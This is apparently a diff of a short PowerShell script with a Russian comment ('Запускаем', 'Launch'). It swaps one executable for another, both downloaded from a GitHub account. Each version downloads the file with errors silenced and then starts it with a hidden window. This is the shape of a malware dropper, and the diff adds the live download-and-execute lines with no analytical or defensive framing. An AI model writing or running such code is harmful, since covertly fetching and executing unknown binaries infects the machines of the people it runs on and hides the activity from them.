@@ -1,5 +1,6 @@
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/ugar.exe" -OutFile "ugar.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe" -OutFile "chekir.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "ugar.exe" -WindowStyle Hidden
+    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
+
 
